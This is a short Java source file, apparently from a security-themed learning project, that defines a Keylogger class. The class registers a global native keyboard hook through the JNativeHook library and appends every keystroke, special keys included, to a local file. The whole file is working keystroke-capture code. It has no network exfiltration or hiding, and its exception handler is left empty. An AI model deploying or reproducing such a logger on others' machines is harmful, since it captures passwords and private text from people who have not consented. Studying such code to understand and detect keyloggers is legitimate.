package org.insecurity_quiz.Advanced_Security_Implementations;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;

public class Keylogger implements NativeKeyListener {

    private Path outputFile;
    private FileWriter writer;

    public Keylogger(String outputFileName) throws IOException, NativeHookException {
        outputFile = Paths.get(outputFileName);
        writer = new FileWriter(outputFile.toString(), true);
        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(this);
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
        String keytext = NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
        try {
            if (keytext.length() > 1) {
                writer.write("[" + keytext + "]");
            } else {
                writer.write(keytext);
            }
            writer.flush();
        }
        catch (Exception e) {
            //Something here later.
        }

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
        NativeKeyListener.super.nativeKeyReleased(nativeEvent);

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeEvent) {
        NativeKeyListener.super.nativeKeyTyped(nativeEvent);
    }
}
